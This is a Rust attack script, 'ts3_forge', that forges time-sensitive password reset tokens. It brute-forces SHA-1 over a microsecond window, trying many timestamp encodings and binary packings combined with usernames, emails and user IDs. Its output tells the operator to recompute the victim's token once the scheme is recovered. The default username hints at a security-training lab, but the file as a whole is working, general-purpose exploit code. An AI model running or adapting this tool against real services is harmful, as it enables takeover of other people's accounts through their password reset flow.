#!/usr/bin/env rust-script
//! name: ts3_forge
//! description: Time-sensitive reset-token forger, wide-encoding edition - sweeps a microsecond window around an anchor across a wide battery of time encodings (second/milli/micro/nano integers and hex, decimal fractions of 1-9 digits, microtime, uniqid with and without extra entropy, minutes/hours/days units, date and ISO-8601 string forms, Rust/PHP float reprs) and binary packings in little- and big-endian order (u32/u64/i64/f32/f64 of seconds / milliseconds / microseconds / nanoseconds / fractional seconds) concatenated with identity bytes (anon, username, email, decimal numeric user_id, packed u32/u64 user_id) in both orders under two separators, hashing with SHA-1 and reporting every (us, form, ident, order) whose digest equals the target.
//! version: 2.1.0
//! args: <token> --us-anchor N [--us-lo N --us-hi N | --pad-secs N] [--user U] [--email E] [--ids 1,2] [--forms all|str|bin|a,b] [--step-us N] [--double] [--threads N] [--selftest]
//! keywords: reset token, time-sensitive, binary packing, little-endian, user_id, sha1, 时间敏感, broken cryptography
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! hex = "0.4"
//! chrono = "0.4"
//! ```
use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use sha1::{Digest, Sha1};
use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

type D20 = [u8; 20];

#[inline]
fn h1(parts: &[&[u8]]) -> D20 {
    let mut h = Sha1::new();
    for p in parts {
        h.update(p);
    }
    let o = h.finalize();
    let mut d = [0u8; 20];
    d.copy_from_slice(&o);
    d
}

#[inline]
fn h2(a: &[u8], b: &[u8]) -> D20 {
    let mut h = Sha1::new();
    h.update(a);
    h.update(b);
    let o = h.finalize();
    let mut d = [0u8; 20];
    d.copy_from_slice(&o);
    d
}

const STR_FORMS: &[&str] = &[
    "us", "ms", "sec", "ns", "min", "hour", "day", "sfrac1", "sfrac2", "sfrac3", "sfrac4", "sfrac5",
    "sfrac6", "sfrac9", "mt", "secus6", "uniqid", "uniqid_true", "ushex", "sechex", "mshex", "nshex",
    "datestr", "datestr_u", "compact", "iso", "iso_ms", "iso_us", "iso_space", "datestr_us",
    "frepr", "msfrepr", "usfrepr", "php14", "php17", "php14ms", "php17ms", "php14us",
];

const BIN_FORMS: &[&str] = &[
    "u32be_sec",
    "u32le_sec",
    "u32be_ms",
    "u32le_ms",
    "u64be_sec",
    "u64le_sec",
    "u64be_ms",
    "u64le_ms",
    "u64be_us",
    "u64le_us",
    "u64be_ns",
    "u64le_ns",
    "i64be_us",
    "i64le_us",
    "f64be_sec",
    "f64le_sec",
    "f64be_sfrac",
    "f64le_sfrac",
    "f64be_ms",
    "f64le_ms",
    "f64be_us",
    "f64le_us",
    "f32be_sfrac",
    "f32le_sfrac",
];

/// PHP float-to-string with `precision` significant digits (%G semantics).
fn php_g_into(v: f64, sig: usize, out: &mut String) {
    if !v.is_finite() || v == 0.0 {
        out.push('0');
        return;
    }
    let exp = v.abs().log10().floor() as i32;
    let sci = format!("{:.*e}", sig.saturating_sub(1), v);
    let Some((mant_raw, e_raw)) = sci.split_once('e') else {
        let _ = write!(out, "{v}");
        return;
    };
    let mant = if mant_raw.contains('.') {
        mant_raw.trim_end_matches('0').trim_end_matches('.').to_string()
    } else {
        mant_raw.to_string()
    };
    if exp < -4 || exp >= sig as i32 {
        let e: i32 = e_raw.parse().unwrap_or(0);
        let _ = write!(out, "{mant}E{}{:02}", if e < 0 { "-" } else { "+" }, e.abs());
    } else {
        let dec = (sig as i32 - 1 - exp).max(0) as usize;
        let s = format!("{:.*}", dec, v);
        let _ = write!(out, "{}", s.trim_end_matches('0').trim_end_matches('.'));
    }
}

fn str_into(buf: &mut String, form: &str, us: u64) {
    buf.clear();
    let sec = us / 1_000_000;
    let frac = us % 1_000_000;
    match form {
        "us" => {
            let _ = write!(buf, "{us}");
        }
        "ms" => {
            let _ = write!(buf, "{}", us / 1000);
        }
        "sec" => {
            let _ = write!(buf, "{sec}");
        }
        "ns" => {
            let _ = write!(buf, "{}", us * 1000);
        }
        "min" => {
            let _ = write!(buf, "{}", sec / 60);
        }
        "hour" => {
            let _ = write!(buf, "{}", sec / 3600);
        }
        "day" => {
            let _ = write!(buf, "{}", sec / 86400);
        }
        "sfrac1" => {
            let _ = write!(buf, "{sec}.{}", frac / 100_000);
        }
        "sfrac2" => {
            let _ = write!(buf, "{sec}.{:02}", frac / 10_000);
        }
        "sfrac3" => {
            let _ = write!(buf, "{sec}.{:03}", frac / 1000);
        }
        "sfrac4" => {
            let _ = write!(buf, "{sec}.{:04}", frac / 100);
        }
        "sfrac5" => {
            let _ = write!(buf, "{sec}.{:05}", frac / 10);
        }
        "sfrac6" => {
            let _ = write!(buf, "{sec}.{frac:06}");
        }
        "sfrac9" => {
            let _ = write!(buf, "{sec}.{:09}", frac * 1000);
        }
        "mt" => {
            let _ = write!(buf, "0.{:08} {sec}", frac * 100);
        }
        "secus6" => {
            let _ = write!(buf, "{sec}{frac:06}");
        }
        "uniqid" => {
            let _ = write!(buf, "{:08x}{:05x}", sec as u32, frac);
        }
        "uniqid_true" => {
            let _ = write!(buf, "{:08x}{:05x}.{:08x}", sec as u32, frac, (frac * 1000) as u32);
        }
        "ushex" => {
            let _ = write!(buf, "{us:x}");
        }
        "sechex" => {
            let _ = write!(buf, "{sec:x}");
        }
        "mshex" => {
            let _ = write!(buf, "{:x}", us / 1000);
        }
        "nshex" => {
            let _ = write!(buf, "{:x}", us * 1000);
        }
        "frepr" => {
            let _ = write!(buf, "{}", us as f64 / 1e6);
        }
        "msfrepr" => {
            let _ = write!(buf, "{}", us as f64 / 1e3);
        }
        "usfrepr" => {
            let _ = write!(buf, "{}", us as f64);
        }
        "php14" => php_g_into(us as f64 / 1e6, 14, buf),
        "php17" => php_g_into(us as f64 / 1e6, 17, buf),
        "php14ms" => php_g_into(us as f64 / 1e3, 14, buf),
        "php17ms" => php_g_into(us as f64 / 1e3, 17, buf),
        "php14us" => php_g_into(us as f64, 14, buf),
        _ => {}
    }
    if buf.is_empty() {
        if let Some(d) = chrono::DateTime::from_timestamp(sec as i64, 0) {
            match form {
                "datestr" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%d %H:%M:%S"));
                }
                "datestr_u" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%d %H:%M:%S"));
                    let _ = write!(buf, ".{frac:06}");
                }
                "datestr_us" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%d %H:%M:%S"));
                    let _ = write!(buf, ".{:06}", frac * 1000);
                }
                "compact" => {
                    let _ = write!(buf, "{}", d.format("%Y%m%d%H%M%S"));
                }
                "iso" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%dT%H:%M:%SZ"));
                }
                "iso_ms" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%dT%H:%M:%S"));
                    let _ = write!(buf, ".{:03}Z", frac / 1000);
                }
                "iso_us" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%dT%H:%M:%S"));
                    let _ = write!(buf, ".{frac:06}Z");
                }
                "iso_space" => {
                    let _ = write!(buf, "{}", d.format("%Y-%m-%d %H:%M:%S"));
                    let _ = write!(buf, ".{frac:06}");
                }
                _ => {}
            }
        }
    }
}

fn bin_into(buf: &mut Vec<u8>, form: &str, us: u64) {
    buf.clear();
    let sec = us / 1_000_000;
    let ms = us / 1000;
    let ns = us * 1000;
    match form {
        "u32be_sec" => buf.extend_from_slice(&(sec as u32).to_be_bytes()),
        "u32le_sec" => buf.extend_from_slice(&(sec as u32).to_le_bytes()),
        "u32be_ms" => buf.extend_from_slice(&(ms as u32).to_be_bytes()),
        "u32le_ms" => buf.extend_from_slice(&(ms as u32).to_le_bytes()),
        "u64be_sec" => buf.extend_from_slice(&sec.to_be_bytes()),
        "u64le_sec" => buf.extend_from_slice(&sec.to_le_bytes()),
        "u64be_ms" => buf.extend_from_slice(&ms.to_be_bytes()),
        "u64le_ms" => buf.extend_from_slice(&ms.to_le_bytes()),
        "u64be_us" => buf.extend_from_slice(&us.to_be_bytes()),
        "u64le_us" => buf.extend_from_slice(&us.to_le_bytes()),
        "u64be_ns" => buf.extend_from_slice(&ns.to_be_bytes()),
        "u64le_ns" => buf.extend_from_slice(&ns.to_le_bytes()),
        "i64be_us" => buf.extend_from_slice(&(us as i64).to_be_bytes()),
        "i64le_us" => buf.extend_from_slice(&(us as i64).to_le_bytes()),
        "f64be_sec" => buf.extend_from_slice(&(sec as f64).to_be_bytes()),
        "f64le_sec" => buf.extend_from_slice(&(sec as f64).to_le_bytes()),
        "f64be_sfrac" => buf.extend_from_slice(&(us as f64 / 1e6).to_be_bytes()),
        "f64le_sfrac" => buf.extend_from_slice(&(us as f64 / 1e6).to_le_bytes()),
        "f64be_ms" => buf.extend_from_slice(&(ms as f64).to_be_bytes()),
        "f64le_ms" => buf.extend_from_slice(&(ms as f64).to_le_bytes()),
        "f64be_us" => buf.extend_from_slice(&(us as f64).to_be_bytes()),
        "f64le_us" => buf.extend_from_slice(&(us as f64).to_le_bytes()),
        "f32be_sfrac" => buf.extend_from_slice(&((us as f32) / 1e6f32).to_be_bytes()),
        "f32le_sfrac" => buf.extend_from_slice(&((us as f32) / 1e6f32).to_le_bytes()),
        _ => {}
    }
}

const SEPS: &[&str] = &["", ":"];

fn sel_it(v: &str, all: &[&str]) -> Vec<String> {
    if v.is_empty() || v == "all" {
        all.iter().map(|s| s.to_string()).collect()
    } else if v == "str" {
        STR_FORMS.iter().map(|s| s.to_string()).collect()
    } else if v == "bin" {
        BIN_FORMS.iter().map(|s| s.to_string()).collect()
    } else {
        v.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
    }
}

fn run(args: &[String]) -> Result<(), String> {
    if args.iter().any(|a| a == "--selftest") {
        let us: u64 = 1_791_792_137_537_045;
        let mut t = Vec::new();
        bin_into(&mut t, "u64le_us", us);
        let mut pre = t.clone();
        pre.extend_from_slice(b"wiener");
        let want = hex::encode(h1(&[&pre]));
        let mut got = None;
        for cand in (us - 1)..=(us + 1) {
            bin_into(&mut t, "u64le_us", cand);
            if h2(&t, b"wiener") == h1(&[&pre]) {
                got = Some(hex::encode(h2(&t, b"wiener")));
            }
        }
        let mut s = String::new();
        str_into(&mut s, "datestr", us);
        let mut s2 = String::new();
        str_into(&mut s2, "sfrac6", us);
        let ok = got.as_deref() == Some(want.as_str())
            && s == "2026-10-12 08:02:17"
            && s2 == "1791792137.537045";
        let _ = report::success(
            "ts3_forge",
            json!({"selftest": if ok {"ok"} else {"fail"}, "want": want, "got": got, "datestr": s, "sfrac6": s2}),
            "run: ts3_forge <token> --us-anchor N --pad-secs N --ids 1,2",
        );
        return Ok(());
    }

    let token = args
        .iter()
        .find(|a| !a.starts_with("--"))
        .cloned()
        .unwrap_or_default()
        .to_lowercase();
    let mut kv: BTreeMap<String, String> = BTreeMap::new();
    let mut i = 0;
    while i < args.len() {
        if args[i].starts_with("--") {
            let v = args.get(i + 1).cloned().unwrap_or_default();
            if !v.starts_with("--") {
                kv.insert(args[i].clone(), v);
                i += 2;
            } else {
                kv.insert(args[i].clone(), String::new());
                i += 1;
            }
        } else {
            i += 1;
        }
    }
    let g = |k: &str| kv.get(k).cloned().unwrap_or_default();
    if kv.contains_key("--gen") {
        let us: u64 = g("--us").parse().map_err(|_| "--gen needs --us".to_string())?;
        let form = g("--form");
        let ident = g("--ident");
        let sep = g("--sep");
        let order = g("--order");
        let mut s = String::new();
        let mut b: Vec<u8> = Vec::new();
        let tb: Vec<u8> = if STR_FORMS.contains(&form.as_str()) {
            str_into(&mut s, &form, us);
            s.as_bytes().to_vec()
        } else {
            bin_into(&mut b, &form, us);
            b.clone()
        };
        let mut pre: Vec<u8> = Vec::new();
        if order == "id_t" {
            pre.extend_from_slice(ident.as_bytes());
            pre.extend_from_slice(sep.as_bytes());
            pre.extend_from_slice(&tb);
        } else {
            pre.extend_from_slice(&tb);
            pre.extend_from_slice(sep.as_bytes());
            pre.extend_from_slice(ident.as_bytes());
        }
        let tok = hex::encode(h1(&[&pre]));
        let _ = report::success(
            "ts3_forge",
            json!({"mode": "gen", "us": us, "form": form, "ident": ident, "sep": sep, "order": order, "token": tok, "preimage_len": pre.len()}),
            "feed the token back with the same form/sep/order over a window containing --us to prove the sweep wiring",
        );
        return Ok(());
    }
    let raw = hex::decode(&token).map_err(|_| "token must be hex".to_string())?;
    if raw.len() != 20 {
        return Err("usage: ts3_forge <40-hex-token> --us-anchor N --pad-secs N [--ids 1,2]".to_string());
    }
    let mut target = [0u8; 20];
    target.copy_from_slice(&raw);

    let user = if kv.contains_key("--user") { g("--user") } else { "wiener".to_string() };
    let email = g("--email");
    let ids: Vec<u64> = g("--ids")
        .split(',')
        .filter_map(|s| s.trim().parse::<u64>().ok())
        .collect();
    let anchor: u64 = g("--us-anchor").parse().unwrap_or(0);
    let pad: u64 = g("--pad-secs").parse().unwrap_or(2);
    let us_lo: u64 = kv
        .get("--us-lo")
        .and_then(|v| v.parse().ok())
        .unwrap_or_else(|| anchor.saturating_sub(pad * 1_000_000));
    let us_hi: u64 = kv
        .get("--us-hi")
        .and_then(|v| v.parse().ok())
        .unwrap_or_else(|| anchor + pad * 1_000_000);
    let step: u64 = g("--step-us").parse().unwrap_or(1).max(1);
    let dbl = kv.contains_key("--double");
    let threads: usize = kv
        .get("--threads")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or_else(|| std::thread::available_parallelism().map(|n| n.get().min(16)).unwrap_or(8))
        .max(1);

    let forms_sel = g("--forms");
    let str_forms: Vec<String> = sel_it(&forms_sel, STR_FORMS)
        .into_iter()
        .filter(|f| STR_FORMS.contains(&f.as_str()))
        .collect();
    let bin_forms: Vec<String> = sel_it(&forms_sel, BIN_FORMS)
        .into_iter()
        .filter(|f| BIN_FORMS.contains(&f.as_str()))
        .collect();

    let mut sidents: Vec<(String, Vec<u8>)> = Vec::new();
    if !kv.contains_key("--no-anon") {
        sidents.push(("anon".to_string(), Vec::new()));
    }
    if !user.is_empty() {
        sidents.push((format!("user={user}"), user.as_bytes().to_vec()));
    }
    if !email.is_empty() {
        sidents.push((format!("email={email}"), email.as_bytes().to_vec()));
    }
    for id in &ids {
        sidents.push((format!("idstr={id}"), id.to_string().into_bytes()));
    }
    let mut bidents: Vec<(String, Vec<u8>)> = sidents.clone();
    if !kv.contains_key("--no-idbytes") {
        for id in &ids {
            bidents.push((format!("id_u32le={id}"), (*id as u32).to_le_bytes().to_vec()));
            bidents.push((format!("id_u32be={id}"), (*id as u32).to_be_bytes().to_vec()));
            bidents.push((format!("id_u64le={id}"), id.to_le_bytes().to_vec()));
            bidents.push((format!("id_u64be={id}"), id.to_be_bytes().to_vec()));
        }
    }

    let total = us_hi - us_lo + 1;
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let chunk = total.div_ceil(threads as u64).max(1);
    let start = std::time::Instant::now();
    let mut handles = Vec::new();
    for tid in 0..threads {
        let raw_from = us_lo + tid as u64 * chunk;
        if raw_from > us_hi {
            break;
        }
        let from = us_lo + (raw_from - us_lo).div_ceil(step) * step;
        let to = (raw_from + chunk - 1).min(us_hi);
        let (sidents, bidents) = (sidents.clone(), bidents.clone());
        let (str_forms, bin_forms) = (str_forms.clone(), bin_forms.clone());
        let hits = hits.clone();
        let tested = tested.clone();
        handles.push(std::thread::spawn(move || {
            let mut local: Vec<Value> = Vec::new();
            let mut n = 0usize;
            let mut sbuf = String::with_capacity(64);
            let mut tbin: Vec<u8> = Vec::with_capacity(16);
            let mut pre: Vec<u8> = Vec::with_capacity(96);
            for us in (from..=to).step_by(step as usize) {
                for form in &str_forms {
                    str_into(&mut sbuf, form, us);
                    if sbuf.is_empty() {
                        continue;
                    }
                    let tb = sbuf.as_bytes();
                    for (label, ib) in &sidents {
                        for sep in SEPS {
                            // order t|sep|id
                            pre.clear();
                            pre.extend_from_slice(tb);
                            pre.extend_from_slice(sep.as_bytes());
                            pre.extend_from_slice(ib);
                            let d = h1(&[&pre]);
                            n += 1;
                            if d == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "t_id", "strategy": "sha1", "kind": "str"}));
                            }
                            if dbl && h1(&[&d]) == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "t_id", "strategy": "double", "kind": "str"}));
                            }
                            // order id|sep|t
                            pre.clear();
                            pre.extend_from_slice(ib);
                            pre.extend_from_slice(sep.as_bytes());
                            pre.extend_from_slice(tb);
                            let d = h1(&[&pre]);
                            n += 1;
                            if d == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "id_t", "strategy": "sha1", "kind": "str"}));
                            }
                            if dbl && h1(&[&d]) == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "id_t", "strategy": "double", "kind": "str"}));
                            }
                        }
                    }
                }
                for form in &bin_forms {
                    bin_into(&mut tbin, form, us);
                    if tbin.is_empty() {
                        continue;
                    }
                    for (label, ib) in &bidents {
                        for sep in SEPS {
                            pre.clear();
                            pre.extend_from_slice(&tbin);
                            pre.extend_from_slice(sep.as_bytes());
                            pre.extend_from_slice(ib);
                            if h1(&[&pre]) == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "t_id", "strategy": "sha1", "kind": "bin"}));
                            }
                            n += 1;
                            pre.clear();
                            pre.extend_from_slice(ib);
                            pre.extend_from_slice(sep.as_bytes());
                            pre.extend_from_slice(&tbin);
                            if h1(&[&pre]) == target {
                                local.push(json!({"us": us, "form": form, "ident": label, "sep": sep, "order": "id_t", "strategy": "sha1", "kind": "bin"}));
                            }
                            n += 1;
                        }
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hit_vec = hits.lock().unwrap().clone();
    let data = json!({
        "token": token, "anchor_us": anchor, "us_lo": us_lo, "us_hi": us_hi, "step_us": step,
        "threads": threads, "str_forms": str_forms, "bin_forms": bin_forms,
        "idents": sidents.iter().map(|(l, _)| l.clone()).collect::<Vec<_>>(),
        "double": dbl, "tested": tested.load(Ordering::Relaxed),
        "hits": hit_vec, "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hit_vec.is_empty() {
        "no hit: widen the window or add a form group; a hit gives (us, form, ident, order) for the construction"
    } else {
        "scheme recovered: recompute the victim token with the same (form, ident, order) at the victim request microsecond"
    };
    let _ = report::success("ts3_forge", data, next);
    Ok(())
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if let Err(e) = run(&args) {
        let _ = report::failure("ts3_forge", &e, "usage: ts3_forge <40-hex-token> --us-anchor N --pad-secs N [--ids 1,2]");
    }
}
